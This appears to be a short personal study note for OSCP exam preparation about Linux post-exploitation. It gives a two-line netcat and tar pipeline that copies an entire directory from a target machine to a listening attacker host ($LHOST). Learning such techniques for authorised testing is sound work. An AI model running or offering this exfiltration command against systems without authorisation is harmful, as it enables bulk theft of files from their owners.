# linux enumeration quick commands copy entire directory to attacker machine quickly by piping tar
attacker
```bash
# attacker
nc -lvnp 1337 | tar -xf -
# target
tar -cf - . | nc $LHOST 1337
```

` zet/20221003150902/README.md `

# Related

- [20221014185808](/zet/20221014185808/README.md) kb file named kb/hacking/priv-esc/enumeration-quick-commands.md
- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
- [20221003150920](/zet/20221003150920/README.md) linux enumeration quick commands
- ~/kb/hacking/priv-esc/enumeration-quick-commands.md

Tags:

    #command #hacking #privesc #enumeration 
